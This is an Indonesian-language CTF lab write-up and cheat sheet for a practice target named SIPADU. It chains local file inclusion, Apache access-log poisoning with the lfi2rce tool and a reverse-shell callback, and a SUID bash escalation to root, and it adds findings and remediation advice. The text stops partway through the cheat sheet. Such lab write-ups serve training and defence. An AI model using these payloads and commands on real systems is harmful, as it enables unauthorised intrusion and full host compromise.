# 05 Write-Up Lab SIPADU
## Local File Inclusion → Apache Access Log Poisoning → RCE `www-data` → SUID Bash → Root

> **Khusus untuk ujian, laboratorium, CTF, atau pengujian keamanan yang telah memperoleh izin.**
>
> Dokumen ini disusun dari evidence pada capture SIPADU dan mengikuti pola penulisan `01_catalina.md`:
> - **Bagian A** membahas seluruh attack path secara detail dan berurutan.
> - **Bagian B** merangkum analisis temuan, dampak, dan rekomendasi.
> - **Bagian C** menyediakan close-book cheat sheet untuk praktik setelah konsep dipahami.

---

## Cara Menggunakan Dokumen

1. Pelajari **Bagian A** untuk memahami hubungan antara LFI, log poisoning, reverse shell, dan privilege escalation.
2. Gunakan **Bagian B** untuk menyusun laporan temuan keamanan.
3. Gunakan **Bagian C** sebagai panduan cepat ketika praktik atau ujian.
4. Sesuaikan IP WSL setiap kali WSL atau Windows di-restart karena IP NAT WSL dapat berubah.

---

## Ringkasan Data Hafalan

```text
TARGET              = 192.168.56.13
NETWORK             = 192.168.56.0/24
WEB_PORTS           = 80, 8081
WEB                 = http://192.168.56.13:8081
PARAM_DISCOVERY_TOOL = Arjun v2.2.7
LFI_PARAMETER       = page
ARJUN_EVIDENCE      = Parameters found: page
LFI_TEST            = ../../../../etc/passwd
SERVICE             = Apache httpd 2.4.67 (Debian)
APPLICATION         = SIPADU - Persuratan & Arsip Digital

ATTACKER_PLATFORM   = WSL 2
WINDOWS_HOST_IP     = 192.168.56.1
WSL_IP              = 172.26.59.55
LPORT               = 12345
LFI2RCE_TEMPLATE    = apache-lin

LOG_TARGET          = /var/log/apache2/access.log
INITIAL_ACCESS      = www-data
USER_FLAG           = /home/petugas/flag.txt
SUID_BINARY         = /usr/bin/bash
PRIVESC_COMMAND     = bash -p
ROOT_FLAG           = /root/flag.txt
```

## Attack Path Singkat

```text
Host discovery 192.168.56.0/24
→ target 192.168.56.13 ditemukan
→ Nmap menemukan Apache pada port 80 dan 8081
→ Arjun menganalisis endpoint dan menemukan parameter page
→ parameter page divalidasi dengan path traversal
→ /etc/passwd berhasil dibaca
→ LFI dikonfirmasi
→ Apache access.log diracuni dengan payload
→ LFI memuat poisoned log
→ command execution dan reverse shell sebagai www-data
→ user flag ditemukan di /home/petugas/flag.txt
→ enumerasi SUID menemukan /usr/bin/bash
→ bash -p mempertahankan effective UID root
→ root flag dibaca dari /root/flag.txt
```

---

# Bagian A — Pembahasan Detail

> Target pembaca: peserta yang ingin memahami alur dari reconnaissance sampai memperoleh root flag, termasuk penyesuaian jaringan ketika attacker berjalan pada WSL 2.

---

## 1. Gambaran Besar

Lab SIPADU memperlihatkan exploit chain yang terdiri dari dua kelemahan utama:

1. Parameter `page` rentan terhadap **Local File Inclusion (LFI)**.
2. Binary `/usr/bin/bash` memiliki bit **SUID**, sehingga shell `www-data` dapat memperoleh effective UID root melalui `bash -p`.

LFI awalnya hanya memberikan kemampuan membaca file lokal. Namun, karena aplikasi dapat memuat file log Apache dan attacker dapat memasukkan data terkontrol ke dalam access log, LFI dapat ditingkatkan menjadi **Remote Code Execution** melalui teknik **Apache access log poisoning**.

Alur lengkap:

```text
Nmap discovery
→ identifikasi target SIPADU
→ validasi port 8081
→ temukan parameter tersembunyi menggunakan Arjun
→ Arjun menemukan parameter page
→ uji ?page= dengan path traversal
→ baca /etc/passwd
→ siapkan dependency lfi2rce
→ atur callback WSL melalui Windows portproxy
→ poison /var/log/apache2/access.log
→ include access.log melalui LFI
→ reverse shell sebagai www-data
→ stabilisasi shell
→ cari dan baca user flag
→ enumerasi SUID
→ temukan /usr/bin/bash
→ jalankan bash -p
→ euid=0(root)
→ cari dan baca root flag
```

---

## 2. Data Lab

| Item | Nilai |
|---|---|
| Network lab | `192.168.56.0/24` |
| Target | `192.168.56.13` |
| Web utama | `http://192.168.56.13:8081` |
| Port terbuka | `80/tcp`, `8081/tcp` |
| Web server | `Apache httpd 2.4.67 (Debian)` |
| Judul aplikasi | `SIPADU - Arsip & Persuratan Digital | Setda` |
| Tool parameter discovery | `Arjun v2.2.7` |
| Parameter ditemukan | `page` |
| Parameter rentan | `page` |
| Bukti LFI | `/etc/passwd` dapat dibaca |
| Tool foothold | `lfi2rce` v1.1 |
| Log yang diracuni | `/var/log/apache2/access.log` |
| Initial access | `www-data`, UID 33 |
| User flag | `/home/petugas/flag.txt` |
| Jalur privilege escalation | SUID `/usr/bin/bash` |
| Root command | `bash -p` |
| Root flag | `/root/flag.txt` |

---

## 3. Fase 1 — Host Discovery

### Tujuan

Menemukan host yang aktif pada jaringan Host-Only `192.168.56.0/24` sebelum melakukan service enumeration.

### Command

```bash
nmap -sn 192.168.56.0/24
```

### Evidence Capture

Capture menunjukkan enam host aktif:

```text
192.168.56.1
192.168.56.12
192.168.56.13
192.168.56.14
192.168.56.100
192.168.56.124
```

### Makna Output

`-sn` melakukan host discovery tanpa port scan penuh. Pada lab ini, target SIPADU kemudian diidentifikasi sebagai:

```text
192.168.56.13
```

> Catatan: `192.168.56.1` adalah interface Windows pada jaringan Host-Only dan nantinya digunakan sebagai alamat callback yang dapat dijangkau target.

---

## 4. Fase 2 — Service Enumeration

### Tujuan

Menentukan port, service, versi, dan identitas aplikasi pada target.

### Command dari Capture

```bash
nmap -sC -sV 192.168.56.13
```

### Output Evidence

```text
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.67 ((Debian))
|_http-title: SIPADU - Arsip & Persuratan Digital | Setda
|_http-server-header: Apache/2.4.67 (Debian)

8081/tcp  open  http    Apache httpd 2.4.67 ((Debian))
|_http-title: SIPADU - Arsip & Persuratan Digital | Setda
|_http-server-header: Apache/2.4.67 (Debian)
```

### Makna Output

Dua port menampilkan aplikasi SIPADU yang sama. Capture eksploitasi menggunakan port `8081`, sehingga pengujian berikutnya difokuskan pada:

```text
http://192.168.56.13:8081
```

### Validasi Tambahan Opsional

```bash
curl -i http://192.168.56.13:8081/
```

atau:

```bash
whatweb http://192.168.56.13:8081/
```

---

## 5. Fase 3 — Menemukan Parameter `page`

Sebelum menguji LFI, penguji perlu mengetahui parameter yang diproses oleh aplikasi. Parameter dapat ditemukan melalui observasi URL secara manual atau menggunakan tool parameter discovery seperti **Arjun**.

### 5.1 Opsi A — Observasi Manual

Aplikasi menggunakan parameter `page` untuk menentukan konten yang dimuat:

```text
http://192.168.56.13:8081/?page=<nilai>
```

Parameter yang mengendalikan nama file atau template merupakan titik yang perlu diuji terhadap path traversal.

Metode manual cukup apabila parameter sudah terlihat pada URL, link navigasi, source HTML, JavaScript, atau request yang ditangkap melalui Burp Suite.

---

### 5.2 Opsi B — Menemukan Parameter Menggunakan Arjun

#### Tujuan

Mengidentifikasi parameter HTTP yang diterima endpoint meskipun parameter tersebut belum diketahui atau tidak terlihat langsung pada halaman.

#### Instalasi Arjun — Jika Belum Tersedia

Di dalam virtual environment:

```bash
cd ~/Downloads
source .venv/bin/activate
python -m pip install arjun
```

Alternatif menggunakan `pipx`:

```bash
pipx install arjun
```

Validasi:

```bash
arjun --help
```

#### Command dari Capture

```bash
arjun -u "http://192.168.56.13:8081"
```

#### Output Evidence Aktual

```text
Arjun v2.2.7

[*] Scanning 0/1: http://192.168.56.13:8081
[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Logicforcing the URL endpoint
[✓] parameter detected: page, based on: body length
[+] Parameters found: page
```

#### Makna Output

Arjun melakukan beberapa langkah:

1. memeriksa kestabilan respons endpoint;
2. mengirim kandidat parameter;
3. membandingkan respons normal dengan respons setelah parameter ditambahkan;
4. mendeteksi anomali pada panjang body;
5. menyimpulkan bahwa endpoint memproses parameter `page`.

Evidence utamanya adalah:

```text
parameter detected: page, based on: body length
Parameters found: page
```

Dengan demikian, format endpoint yang perlu diuji adalah:

```text
http://192.168.56.13:8081/?page=<payload>
```

> **Catatan penting:** Arjun hanya membuktikan bahwa parameter `page` diproses oleh aplikasi. Hasil tersebut belum membuktikan adanya LFI. Kerentanan tetap harus divalidasi dengan payload path traversal dan evidence pembacaan file lokal.

#### Simpan Hasil — Opsional

```bash
arjun \
  -u "http://192.168.56.13:8081" \
  -oJ arjun_sipadu.json
```

Hasil JSON dapat digunakan sebagai evidence atau input pengujian lanjutan.

---

### 5.3 Validasi Parameter terhadap LFI

Payload dari capture:

```text
../../../../etc/passwd
```

#### Pengujian melalui Browser

```text
http://192.168.56.13:8081/?page=../../../../etc/passwd
```

#### Pengujian melalui Curl

```bash
BASE="http://192.168.56.13:8081"

curl -s "$BASE/?page=../../../../etc/passwd"
```

#### Output Evidence

Halaman SIPADU menampilkan isi `/etc/passwd`, termasuk akun lokal:

```text
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
petugas:x:1000:1000::/home/petugas:/bin/bash
```

#### Makna Output

Keberhasilan membaca `/etc/passwd` membuktikan bahwa:

- Arjun berhasil menemukan parameter yang benar;
- input `page` tidak dibatasi pada daftar template yang diizinkan;
- traversal `../` dapat keluar dari direktori aplikasi;
- aplikasi membaca dan menampilkan file lokal;
- vulnerability dapat diklasifikasikan sebagai **Local File Inclusion / Path Traversal**.

Akun `petugas` juga memberikan petunjuk bahwa home directory berikut layak diperiksa setelah memperoleh shell:

```text
/home/petugas
```

---

## 6. Fase 4 — Memahami LFI ke RCE melalui Log Poisoning

### Konsep

LFI biasanya memberikan arbitrary local file read. Agar berubah menjadi RCE, attacker membutuhkan file lokal yang:

1. dapat dipengaruhi isinya oleh attacker; dan
2. dapat dimuat oleh parameter LFI; dan
3. diproses sebagai kode oleh aplikasi.

Pada Apache, request masuk dicatat ke access log. Salah satu nilai yang lazim masuk ke log adalah `User-Agent`. Dengan mengirimkan payload kode ke header tersebut, access log dapat “diracuni”. Ketika file log kemudian di-include oleh aplikasi rentan, payload dapat dieksekusi.

Pada lab ini, tool menggunakan log:

```text
/var/log/apache2/access.log
```

Attack path teknis:

```text
request dengan payload pada header
→ payload tercatat di access.log
→ ?page=/var/log/apache2/access.log
→ aplikasi meng-include log
→ interpreter mengeksekusi payload
→ command execution
```

---

## 7. Fase 5 — Menyiapkan Tool `lfi2rce`

Repository yang dicantumkan pada capture:

```text
https://github.com/0bfxgh0st/lfi2rce
```

### 7.1 Siapkan Working Directory

```bash
cd ~/Downloads
```

Jika belum memiliki tool:

```bash
git clone https://github.com/0bfxgh0st/lfi2rce.git
cd lfi2rce
```

Sesuaikan cara eksekusi dengan nama file yang tersedia pada repository.

### 7.2 Gunakan Virtual Environment

Kali Linux modern dapat membatasi instalasi paket langsung ke Python sistem. Gunakan virtual environment:

```bash
python3 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip
```

Prompt akan berubah, misalnya:

```text
(.venv)(cakgup㉿SITP)-[~/Downloads]
```

### 7.3 Instal Dependency

Pada percobaan awal, script menghasilkan:

```text
ModuleNotFoundError: No module named 'paramiko'
```

Instal modul yang diperlukan:

```bash
python -m pip install requests paramiko
```

Validasi:

```bash
python -c "import requests, paramiko; print('dependency OK')"
```

Expected:

```text
dependency OK
```

---

## 8. Fase 6 — Menyiapkan Callback WSL 2

### 8.1 Masalah Jaringan

Attacker dijalankan dari WSL 2 dengan IP:

```bash
ip -br addr
```

Evidence:

```text
eth0  UP  172.26.59.55/20
```

Target berada pada jaringan:

```text
192.168.56.0/24
```

Alamat `172.26.59.55` adalah alamat NAT internal WSL. Target VirtualBox tidak mempunyai rute langsung ke alamat tersebut. Karena itu callback harus diarahkan ke interface Windows yang berada pada jaringan Host-Only, kemudian diteruskan ke WSL.

### 8.2 Cari IP Windows Host-Only

Jalankan pada PowerShell:

```powershell
Get-NetIPAddress -AddressFamily IPv4 |
    Where-Object { $_.IPAddress -like "192.168.56.*" }
```

Evidence:

```text
IPAddress      : 192.168.56.1
InterfaceAlias : Ethernet 5
PrefixLength   : 24
```

Dengan demikian:

```text
WINDOWS_HOST_IP = 192.168.56.1
WSL_IP          = 172.26.59.55
```

### 8.3 Buka PowerShell sebagai Administrator

Command `portproxy` dan perubahan firewall memerlukan elevated privileges.

Dari PowerShell biasa:

```powershell
Start-Process powershell -Verb RunAs
```

Klik **Yes** pada UAC. Judul jendela harus menunjukkan PowerShell berjalan sebagai Administrator.

Tanpa elevation, akan muncul:

```text
The requested operation requires elevation (Run as administrator).
Access is denied.
```

### 8.4 Buat Port Forwarding Windows ke WSL

Pada PowerShell Administrator:

```powershell
netsh interface portproxy add v4tov4 `
  listenaddress=0.0.0.0 `
  listenport=12345 `
  connectaddress=172.26.59.55 `
  connectport=12345
```

Tambahkan firewall rule, dibatasi ke jaringan lab:

```powershell
New-NetFirewallRule `
  -DisplayName "WSL Listener 12345" `
  -Direction Inbound `
  -Action Allow `
  -Protocol TCP `
  -LocalPort 12345 `
  -RemoteAddress 192.168.56.0/24
```

Pastikan layanan IP Helper aktif:

```powershell
Set-Service iphlpsvc -StartupType Automatic
Start-Service iphlpsvc
```

### 8.5 Verifikasi Portproxy

```powershell
netsh interface portproxy show v4tov4
```

Expected:

```text
Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
0.0.0.0         12345       172.26.59.55    12345
```

### 8.6 Diagram Alur Callback

```text
Target SIPADU
192.168.56.13
      |
      | TCP callback ke 192.168.56.1:12345
      v
Windows Host-Only Adapter
192.168.56.1:12345
      |
      | netsh portproxy
      v
WSL Gateway / NAT
172.26.48.1
      |
      v
Listener lfi2rce di WSL
172.26.59.55:12345
```

---

## 9. Fase 7 — Mengatasi Port Listener yang Sudah Digunakan

Saat listener sebelumnya belum berhenti, script dapat menghasilkan:

```text
OSError: [Errno 98] Address already in use
```

### Cek Pemilik Port

```bash
sudo ss -lntp | grep ':12345'
```

atau:

```bash
sudo lsof -nP -iTCP:12345 -sTCP:LISTEN
```

### Hentikan Listener Lama

```bash
sudo fuser -k 12345/tcp
```

Validasi port sudah kosong:

```bash
sudo ss -lntp | grep ':12345'
```

Tidak boleh ada output sebelum `lfi2rce` dijalankan kembali.

> Jangan membuka `nc -lvnp 12345` secara terpisah. Script `lfi2rce` membuat listener sendiri pada port yang diberikan melalui opsi `-p`.

---

## 10. Fase 8 — Menjalankan LFI-to-RCE

### Command Final dari Capture

```bash
cd ~/Downloads
source .venv/bin/activate

python lfi2rce \
  -u "http://192.168.56.13:8081/?page=" \
  -t apache-lin \
  -r 192.168.56.1 \
  -p 12345
```

### Arti Opsi

| Opsi | Nilai | Fungsi |
|---|---|---|
| `-u` | URL dengan parameter `page=` | Menentukan endpoint LFI |
| `-t` | `apache-lin` | Menggunakan template Apache pada Linux |
| `-r` | `192.168.56.1` | Alamat callback yang dapat dijangkau target |
| `-p` | `12345` | Port listener dan callback |

### Output Evidence

```text
lfi2rce - Local File Inclusion To Remote Code Execution v1.1 by 0bfxgh0st*

💀 Poison /var/log/apache2/access.log
💀 Sending payload

listening on [any] 12345 ...
connect to [172.26.59.55] from [172.26.48.1] 59885
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.2$
```

### Makna Output

Baris berikut membuktikan exploit chain berhasil:

```text
Poison /var/log/apache2/access.log
Sending payload
```

Kemudian:

```text
connect to [172.26.59.55] from [172.26.48.1]
```

menunjukkan bahwa koneksi yang awalnya diarahkan target ke Windows `192.168.56.1:12345` telah diteruskan ke listener WSL. Alamat sumber yang terlihat sebagai `172.26.48.1` adalah sisi gateway Windows pada jaringan WSL.

Pesan:

```text
bash: no job control in this shell
```

normal untuk reverse shell awal dan bukan tanda exploit gagal.

---

## 11. Fase 9 — Validasi Initial Access

### Command

```bash
id
```

### Output Evidence

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Makna Output

Attacker memperoleh command execution sebagai account service web:

```text
www-data
```

Tahap LFI-to-RCE sudah terbukti. Selanjutnya lakukan stabilisasi shell dan local enumeration.

---

## 12. Fase 10 — Stabilisasi Shell

### Spawn PTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Set Environment

```bash
export TERM=xterm
export SHELL=/bin/bash
```

### Validasi

```bash
id
whoami
hostname
pwd
```

Expected minimum:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
```

### Upgrade Terminal Penuh — Opsional

Tekan:

```text
Ctrl+Z
```

Pada terminal WSL lokal:

```bash
stty raw -echo; fg
```

Tekan Enter, lalu pada shell target:

```bash
reset
export TERM=xterm-256color
stty rows 40 columns 140
```

---

## 13. Fase 11 — Cari dan Baca User Flag

### Jangan Menebak Lokasi Flag

Cari terlebih dahulu:

```bash
find / -type f -iname "*flag*" 2>/dev/null
```

### Output Evidence

```text
/home/petugas/flag.txt
```

### Baca User Flag

```bash
cat /home/petugas/flag.txt
```

### Output Evidence

```text
FLAG{l0g_p01s0n_lfi_2c7a9e41}
```

### Makna Flag

Nama flag mengonfirmasi jalur initial access:

```text
log poison + LFI
```

User flag membuktikan bahwa eksploitasi aplikasi dan initial foothold berhasil sebelum privilege escalation dilakukan.

---

## 14. Fase 12 — Enumerasi Privilege Escalation

### Tujuan

Mencari salah konfigurasi lokal yang dapat digunakan account `www-data` untuk memperoleh hak lebih tinggi.

### Pemeriksaan Dasar

```bash
id
uname -a
```

### Cari Binary SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

### Output Evidence dari Capture

```text
/usr/bin/bash
/usr/bin/mount
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chsh
```

### Analisis

Sebagian binary seperti `passwd`, `su`, `mount`, dan `umount` dapat ditemukan sebagai SUID pada konfigurasi Linux tertentu. Namun, temuan yang paling tidak biasa dan langsung dapat dieksploitasi adalah:

```text
/usr/bin/bash
```

Bash tidak seharusnya diberi bit SUID pada konfigurasi normal. Jika dimiliki root dan SUID aktif, Bash dapat mempertahankan effective UID melalui opsi `-p`.

### Verifikasi Permission

```bash
ls -l /usr/bin/bash
stat -c '%A %U %G %n' /usr/bin/bash
```

Expected ketika SUID aktif:

```text
-rwsr-xr-x root root /usr/bin/bash
```

Perhatikan karakter `s` pada permission owner:

```text
-rwsr-xr-x
   ^
   SUID
```

---

## 15. Fase 13 — Privilege Escalation melalui SUID Bash

```bash
bash -p
```

atau secara eksplisit:

```bash
/usr/bin/bash -p
```

### Mengapa Menggunakan `-p`

Opsi `-p` menjalankan Bash dalam privileged mode sehingga Bash tidak membuang effective UID yang diwarisi dari binary SUID.

Tanpa `-p`, Bash dapat menurunkan privilege untuk alasan keamanan.

### Validasi Root

```bash
id
whoami
```

### Output Evidence

```text
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
root
```

### Cara Membaca Output

```text
uid=33(www-data)
```

menunjukkan real UID proses masih `www-data`.

```text
euid=0(root)
```

menunjukkan effective UID adalah root. Pemeriksaan akses file dan eksekusi command menggunakan effective UID ini, sehingga shell memiliki hak administratif penuh.

Prompt juga berubah dari:

```text
bash-5.2$
```

menjadi:

```text
bash-5.2#
```

Tanda `#` merupakan indikator tambahan bahwa shell berjalan dengan privilege root.

---

## 16. Fase 14 — Cari dan Baca Root Flag

### Cari Flag Setelah Root

```bash
find / -type f -iname "*flag*" 2>/dev/null
```

### Lokasi Evidence

```text
/root/flag.txt
```

### Baca Root Flag

```bash
cat /root/flag.txt
```

### Output Final

```text
FLAG{r00t_v1a_su1d_bash_8f3b1d60}
```

Root flag membuktikan seluruh exploit chain selesai:

```text
LFI
→ Apache access log poisoning
→ RCE www-data
→ SUID Bash
→ effective UID root
→ root flag
```

---

## 17. Validasi Akhir

Gunakan command berikut untuk mengumpulkan evidence akhir:

```bash
id
whoami
hostname
pwd
ls -l /usr/bin/bash
cat /home/petugas/flag.txt
cat /root/flag.txt
```

Expected bagian penting:

```text
euid=0(root)
root
FLAG{l0g_p01s0n_lfi_2c7a9e41}
FLAG{r00t_v1a_su1d_bash_8f3b1d60}
```

---

## 18. Alur Hafalan SIPADU

```text
nmap -sn 192.168.56.0/24
→ target 192.168.56.13
→ nmap -sC -sV 192.168.56.13
→ Apache 80/8081
→ arjun -u http://192.168.56.13:8081
→ Parameters found: page
→ ?page=../../../../etc/passwd
→ /etc/passwd tampil
→ venv + requests + paramiko
→ Windows 192.168.56.1 portproxy ke WSL 172.26.59.55
→ lfi2rce apache-lin port 12345
→ access.log poisoned
→ shell www-data
→ stabilisasi PTY
→ find flag
→ /home/petugas/flag.txt
→ find SUID
→ /usr/bin/bash
→ bash -p
→ euid=0(root)
→ /root/flag.txt
```

---

# Bagian B — Analisis Temuan dan Rekomendasi

## 1. Rantai Kerentanan

```text
Parameter page menerima path traversal
→ attacker membaca arbitrary local file
→ access log Apache dapat dipengaruhi melalui request
→ access log di-include oleh aplikasi rentan
→ payload pada log diproses sebagai kode
→ RCE sebagai www-data
→ /usr/bin/bash memiliki SUID root
→ bash -p mempertahankan effective UID 0
→ full root compromise
```

Eksploitasi berhasil bukan karena satu kelemahan saja, melainkan kombinasi **input validation failure**, **unsafe file inclusion**, dan **dangerous local privilege configuration**.

---

## 2. Temuan 1 — Local File Inclusion pada Parameter `page`

### Deskripsi

Parameter `page` menerima path yang dikendalikan pengguna dan menggunakannya untuk memuat file tanpa allowlist atau validasi path yang memadai. Payload traversal berhasil keluar dari direktori aplikasi dan membaca `/etc/passwd`.

### Evidence Utama

```text
GET /?page=../../../../etc/passwd
→ isi /etc/passwd tampil pada halaman SIPADU
→ akun petugas dan www-data terungkap
```

### Dampak

Attacker dapat:

- membaca file konfigurasi aplikasi;
- memperoleh credential database atau secret;
- membaca source code;
- melakukan reconnaissance sistem operasi;
- mengakses file sensitif sesuai permission account web server;
- meningkatkan LFI menjadi RCE ketika file yang dapat dipengaruhi attacker ikut dimuat.

### Rekomendasi

- Jangan menggunakan input pengguna sebagai path file langsung.
- Gunakan mapping statis antara nama halaman dan template.
- Terapkan allowlist identifier, bukan blacklist karakter.
- Lakukan canonicalization dan verifikasi bahwa path final tetap berada dalam direktori template.
- Tolak input yang memuat `..`, absolute path, null byte, wrapper, atau separator yang tidak diperlukan.
- Jalankan aplikasi dengan account least privilege.

Contoh pola aman secara konseptual:

```text
?page=beranda  → /app/templates/beranda.php
?page=arsip    → /app/templates/arsip.php
```

Bukan:

```text
include($_GET['page'])
```

---

## 3. Temuan 2 — LFI dapat Ditingkatkan menjadi RCE melalui Apache Log Poisoning

### Deskripsi

Aplikasi mampu meng-include access log Apache. Attacker dapat memasukkan payload ke request yang dicatat pada log dan kemudian memuat log tersebut melalui parameter LFI. Payload dieksekusi dalam konteks account `www-data`.

### Evidence Utama

```text
Poison /var/log/apache2/access.log
Sending payload
connect to listener
id → uid=33(www-data)
```

### Dampak

Attacker memperoleh arbitrary command execution pada server dengan hak account web service. RCE dapat digunakan untuk:

- membaca data aplikasi;
- mencuri secret dan credential;
- mengubah file yang writable;
- membuat persistence;
- melakukan lateral movement;
- mencari local privilege escalation.

### Rekomendasi

- Perbaiki LFI sebagai kontrol utama.
- Pastikan direktori dan file log tidak dapat dibaca oleh proses aplikasi bila tidak diperlukan.
- Pisahkan permission service web server dan application runtime.
- Hindari evaluasi file log atau file non-template sebagai kode.
- Terapkan AppArmor/SELinux profile untuk membatasi file yang dapat dibaca aplikasi.
- Monitor request dengan path traversal dan payload script pada header HTTP.
- Aktifkan file-integrity monitoring pada source code dan direktori aplikasi.

---

## 4. Temuan 3 — SUID Bit pada `/usr/bin/bash`

### Deskripsi

Binary `/usr/bin/bash` ditemukan dalam daftar file SUID. Ketika dijalankan dengan opsi `-p`, Bash mempertahankan effective UID root dan memberikan shell dengan `euid=0` kepada account `www-data`.

### Evidence Utama

```text
find / -perm -4000 -type f
→ /usr/bin/bash

bash -p
id
→ uid=33(www-data) gid=33(www-data) euid=0(root)

whoami
→ root
```

### Dampak

Setiap user lokal yang dapat mengeksekusi Bash dapat memperoleh privilege root. Ini merupakan local privilege escalation yang bersifat langsung dan kritis.

### Rekomendasi

Hapus SUID dari Bash:

```bash
chown root:root /usr/bin/bash
chmod u-s /usr/bin/bash
```

Validasi:

```bash
ls -l /usr/bin/bash
```

Permission tidak boleh menampilkan `s` pada owner execute bit.

Lakukan audit menyeluruh:

```bash
find / -xdev -perm -4000 -type f -ls 2>/dev/null
find / -xdev -perm -2000 -type f -ls 2>/dev/null
getcap -r / 2>/dev/null
```

Tambahan:

- Bandingkan daftar SUID dengan baseline sistem.
- Gunakan package verification untuk mendeteksi perubahan permission.
- Alert ketika bit SUID ditambahkan ke binary baru.
- Terapkan `nosuid` pada filesystem yang tidak membutuhkan SUID.

---

## 5. Severity dan Rantai Dampak

| Tahap | Kelemahan | Hasil |
|---|---|---|
| Initial discovery | Web service terekspos | SIPADU ditemukan pada port 80/8081 |
| File read | LFI pada `page` | `/etc/passwd` dibaca |
| Code execution | Log poisoning + LFI | Shell sebagai `www-data` |
| Local escalation | SUID Bash | `euid=0(root)` |
| Final impact | Root access | Seluruh host dapat dikompromikan |

Secara keseluruhan, exploit chain memiliki dampak **Critical** karena attacker tanpa akses awal dapat mencapai full system compromise.

---

## 6. Checklist Evidence untuk Laporan

| Tahap | Evidence yang Dicatat |
|---|---|
| Host discovery | Output `nmap -sn` dan target `192.168.56.13` |
| Service enumeration | Port 80/8081, Apache 2.4.67 Debian, title SIPADU |
| Parameter discovery | Arjun menemukan `page` berdasarkan perbedaan body length |
| LFI | URL traversal dan isi `/etc/passwd` |
| User enumeration | Baris akun `petugas` dan `www-data` |
| Tool preparation | Virtual environment dan dependency `paramiko` |
| WSL routing | Windows `192.168.56.1`, WSL `172.26.59.55`, portproxy |
| Log poisoning | Output `Poison /var/log/apache2/access.log` |
| Reverse shell | Baris `connect to ...` |
| Initial access | `id` sebagai UID 33 `www-data` |
| User flag | `/home/petugas/flag.txt` |
| SUID enumeration | `/usr/bin/bash` dalam hasil `find` |
| Root | `id` menampilkan `euid=0(root)` dan `whoami=root` |
| Root flag | `/root/flag.txt` |

---

## 7. Ringkasan Temuan Siap Laporan

```text
Aplikasi SIPADU pada 192.168.56.13:8081 memiliki kerentanan Local File
Inclusion pada parameter `page`. Parameter tersebut dapat ditemukan secara manual
maupun melalui Arjun, yang mendeteksi anomali panjang body dan menampilkan
`Parameters found: page`. Payload path traversal kemudian berhasil membaca
/etc/passwd dan mengungkap informasi account lokal. Kerentanan tersebut dapat
ditingkatkan menjadi remote code execution melalui Apache access log poisoning.
Payload yang dicatat pada /var/log/apache2/access.log dimuat kembali melalui
parameter LFI dan menghasilkan reverse shell sebagai account www-data.

Setelah memperoleh initial access, enumerasi file SUID menemukan bahwa
/usr/bin/bash memiliki bit SUID root. Menjalankan Bash dengan opsi `-p`
mempertahankan effective UID dari binary tersebut dan menghasilkan shell dengan
euid=0(root). Dengan akses tersebut, attacker dapat membaca /root/flag.txt dan
menguasai seluruh sistem.
```

---

# Bagian C — Close Book dan Cheat Sheet

> Gunakan bagian ini hanya setelah memahami Bagian A. Nilai IP WSL harus diverifikasi setiap kali lingkungan di-restart.

---

## 1. Set Variabel

```bash
TARGET="192.168.56.13"
BASE="http://192.168.56.13:8081"
LFI_URL="http://192.168.56.13:8081/?page="
WINDOWS_IP="192.168.56.1"
WSL_IP="172.26.59.55"
LPORT="12345"
```

---

## 2. Recon

```bash
nmap -sn 192.168.56.0/24
nmap -sC -sV "$TARGET"
```

Expected:

```text
80/tcp   open  http  Apache httpd 2.4.67 (Debian)
8081/tcp open  http  Apache httpd 2.4.67 (Debian)
SIPADU - Arsip & Persuratan Digital | Setda
```

---

## 3. Temukan Parameter dengan Arjun — Alternatif

```bash
source ~/Downloads/.venv/bin/activate 2>/dev/null || true
arjun -u "$BASE"
```

Expected:

```text
parameter detected: page, based on: body length
Parameters found: page
```

Hasil Arjun menentukan URL pengujian berikut:

```text
http://192.168.56.13:8081/?page=
```

> Langkah ini menemukan kandidat parameter. Validasi LFI tetap dilakukan pada langkah berikutnya.

---

## 4. Validasi LFI

```bash
curl -s "$BASE/?page=../../../../etc/passwd" | grep -E 'root:|www-data:|petugas:'
```

Expected:

```text
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
petugas:x:1000:1000::/home/petugas:/bin/bash
```

---

## 5. Setup Python

```bash
cd ~/Downloads
python3 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip
python -m pip install requests paramiko
```

---

## 6. Setup Portproxy — PowerShell Administrator

```powershell
netsh interface portproxy add v4tov4 `
  listenaddress=0.0.0.0 `
  listenport=12345 `
  connectaddress=172.26.59.55 `
  connectport=12345

New-NetFirewallRule `
  -DisplayName "WSL Listener 12345" `
  -Direction Inbound `
  -Action Allow `
  -Protocol TCP `
  -LocalPort 12345 `
  -RemoteAddress 192.168.56.0/24

netsh interface portproxy show v4tov4
```

---

## 7. Bersihkan Port Lama

```bash
sudo fuser -k 12345/tcp 2>/dev/null
sudo ss -lntp | grep ':12345'
```

Output pemeriksaan terakhir harus kosong.

---

## 8. Jalankan Exploit

```bash
python lfi2rce \
  -u "$LFI_URL" \
  -t apache-lin \
  -r "$WINDOWS_IP" \
  -p "$LPORT"
```

Expected:

```text
Poison /var/log/apache2/access.log
Sending payload
listening on [any] 12345 ...
connect to [172.26.59.55] from [172.26.48.1] ...
```

---

## 9. Setelah Shell Masuk

```bash
id
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=/bin/bash
```

Expected:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 10. User Flag

```bash
find / -type f -iname "*flag*" 2>/dev/null
cat /home/petugas/flag.txt
```

Expected:

```text
FLAG{l0g_p01s0n_lfi_2c7a9e41}
```

---

## 11. Privilege Escalation

```bash
find / -perm -4000 -type f 2>/dev/null
ls -l /usr/bin/bash
